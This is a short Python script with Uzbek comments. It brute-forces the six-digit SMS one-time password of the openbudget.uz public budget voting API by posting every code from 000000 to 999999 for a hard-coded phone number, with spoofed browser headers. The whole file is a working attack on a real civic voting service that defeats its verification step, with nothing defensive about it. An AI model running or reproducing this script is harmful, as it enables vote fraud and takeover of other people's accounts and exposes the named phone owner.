import requests
import itertools

# API manzili
url = "https://openbudget.uz/api/v2/vote/mvc/verify"

# HTTP so‘rovga yuborilishi kerak bo‘lgan `headers`
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Referer": "https://openbudget.uz/api/v2/vote/mvc/captcha"
}

# Telefon raqamingizni kiritish kerak bo'lsa, uni shu yerga qo'shing
phone_number = "94 194-45-66"  # Faqatgina raqamlar, prefiks (+998) qo‘shilmaydi

def check_otp(code):
    data = {
        "otpCode": code,  # 6 xonali kod
        "phone": phone_number  # Telefon raqami (agar kerak bo'lsa)
    }

    response = requests.post(url, headers=headers, data=data)

    # Agar server 200 yoki boshqa muvaffaqiyatli kod qaytarsa, kod to‘g‘ri deb hisoblaymiz
    if response.status_code == 200:
        print(f"OTP topildi: {code}")
        return True
    else:
        print(f"Xato kod: {code} - Status: {response.status_code}")

    return False

# Brute-force qilish
def brute_force_otp():
    for code_tuple in itertools.product("0123456789", repeat=6):
        code = "".join(code_tuple)
        if check_otp(code):
            return code  # To‘g‘ri kod topildi
    return None

otp_code = brute_force_otp()
if otp_code:
    print(f"To‘g‘ri kod: {otp_code}")
else:
    print("OTP topilmadi")
